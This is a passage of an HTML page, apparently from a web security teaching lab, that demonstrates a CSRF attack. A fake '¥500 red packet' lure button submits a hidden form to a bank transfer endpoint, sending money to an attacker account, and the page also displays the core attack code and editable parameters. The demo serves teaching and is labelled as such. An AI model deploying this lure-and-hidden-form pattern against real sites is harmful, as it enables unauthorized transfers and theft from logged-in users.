        .code-section {

        .code-header {
            background: #2d2d2d;

        }
        .code-header h3 {

            display: flex;
            align-items: center;
            gap: 8px;
        }
        .code-header .btn-toggle {
            background: #ff6b6b;

            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;

            transition: background 0.3s;
        }
        .code-header .btn-toggle:hover {

        }
        .code-body {
            padding: 15px;
            display: none;
        }
        .code-body.show {
            display: block;
        }
        .code-body textarea {
            width: 100%;
            background: #1e1e1e;
            color: #f8f8f2;
            border: none;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            line-height: 1.5;
            resize: vertical;
            min-height: 180px;
            padding: 0;
        }
        .code-body textarea:focus {
            outline: none;
        }
        .info-box {
            background: #e8f4f8;
            border: 1px solid #bee3f8;
            border-radius: 8px;
            padding: 12px 15px;
            color: #2c5282;
            margin-bottom: 18px;
            font-size: 0.9em;
        }
        .info-box h4 {
            margin-bottom: 8px;
            font-size: 0.95em;
        }
        .info-box p {
            margin: 4px 0;
        }
        .info-box code {
            background: rgba(255,255,255,0.5);
            padding: 2px 6px;
            border-radius: 3px;
            font-family: monospace;
            font-size: 0.9em;
        }
        .btn-claim {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-claim:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(238,90,111,0.4);
        }
        .btn-claim:active {
            transform: translateY(0);
        }
        .hidden-form {
            display: none;
        }

<body>
    <div class="attack-container">
        <div class="nav-bar">
            <span class="title">🎯 CSRF攻击演示</span>
            <a href="../../index.php">🏠 返回主页</a>
        </div>
        
        <div class="attack-header">
            <div class="icon">🎁</div>
            <h1>恭喜您！</h1>
            <p>您获得了一个专属红包</p>
        </div>
        
        <div class="attack-body">
            <div class="prize-box">
                <div class="label">红包金额</div>
                <div class="amount">¥500</div>
                <div class="label">点击下方按钮立即领取</div>
            </div>
            
            <div class="warning-box">
                <h3>⚠️ 这是一次CSRF攻击演示</h3>
                <p>当您点击"立即领取"按钮时，实际上会执行以下操作：</p>
                <ul>
                    <li>向银行系统发送隐藏的转账请求</li>
                    <li>从您的账户向攻击者账户转账 <strong>500元</strong></li>
                    <li>由于您已登录银行系统，请求会成功执行</li>
                </ul>
            </div>
            
            <div class="param-editor">
                <h4>🔧 攻击参数配置（可自由修改）</h4>
                <div class="param-row">
                    <div class="param-group">
                        <label>收款账号</label>
                        <input type="text" id="to_account" value="6222021234567890456">
                    </div>
                    <div class="param-group">
                        <label>转账金额</label>
                        <input type="number" id="amount" value="500">
                    </div>
                </div>
                <div class="param-row single">
                    <div class="param-group">
                        <label>转账备注</label>
                        <input type="text" id="remark" value="红包领取">
                    </div>
                </div>
            </div>
            
            <div class="code-section">
                <div class="code-header">
                    <h3>💻 核心攻击代码</h3>
                    <button class="btn-toggle" onclick="toggleCode()">显示/隐藏</button>
                </div>
                <div class="code-body" id="codeBody">
                    <textarea id="attackCode" readonly></textarea>
                </div>
            </div>
            
            <div class="info-box">
                <h4>🎯 攻击原理</h4>
                <p>攻击者构造了一个恶意页面，包含自动提交的表单</p>
                <p>目标：<code>account.php</code> 的转账接口</p>
                <p>收款账号：<code id="displayAccount">6222021234567890456</code>（李四）</p>
                <p>转账金额：<code id="displayAmount">500元</code></p>
            </div>
            
            <form id="attackForm" class="hidden-form" method="POST" action="account.php">
                <input type="hidden" name="action" value="transfer">
                <input type="hidden" name="to_account" id="form_to_account" value="6222021234567890456">
                <input type="hidden" name="amount" id="form_amount" value="500">
                <input type="hidden" name="remark" id="form_remark" value="红包领取">
            </form>
            
            <button type="button" class="btn-claim" onclick="submitAttack()">🎁 立即领取</button>
        </div>
    </div>
    
    <script>
        // 初始化代码
        function initCode() {
            updateCode();
        }
        
        // 显示/隐藏代码
        function toggleCode() {
            const codeBody = document.getElementById('codeBody');
            codeBody.classList.toggle('show');
        }
        
        // 更新代码显示
        function updateCode() {
            const to_account = document.getElementById('to_account').value;
            const amount = document.getElementById('amount').value;
            const remark = document.getElementById('remark').value;
            
            const code = `<!-- 隐藏的攻击表单 -->
<form id="attackForm" style="display:none" method="POST" action="account.php">
    <!-- 关键：没有CSRF Token，攻击可以成功 -->
    <input type="hidden" name="action" value="transfer">
    <input type="hidden" name="to_account" value="${to_account}">
    <input type="hidden" name="amount" value="${amount}">
    <input type="hidden" name="remark" value="${remark}">
</form>

<script>
// 自动提交表单
function submitAttack() {
    document.getElementById('attackForm').submit();
}
<\/script>`;
            
            document.getElementById('attackCode').value = code;
        }
        
        // 实时更新攻击参数
        document.getElementById('to_account').addEventListener('input', function() {
            document.getElementById('form_to_account').value = this.value;
            document.getElementById('displayAccount').textContent = this.value;
            updateCode();
        });
        
        document.getElementById('amount').addEventListener('input', function() {
            document.getElementById('form_amount').value = this.value;
            document.getElementById('displayAmount').textContent = this.value + '元';
            updateCode();
        });
        
        document.getElementById('remark').addEventListener('input', function() {
            document.getElementById('form_remark').value = this.value;
            updateCode();
        });
        
        // 提交攻击
        function submitAttack() {
            document.getElementById('form_to_account').value = document.getElementById('to_account').value;
            document.getElementById('form_amount').value = document.getElementById('amount').value;
            document.getElementById('form_remark').value = document.getElementById('remark').value;
            document.getElementById('attackForm').submit();
        }
        
        // 页面加载初始化
        window.onload = initCode;
    </script>
</body>
</html>
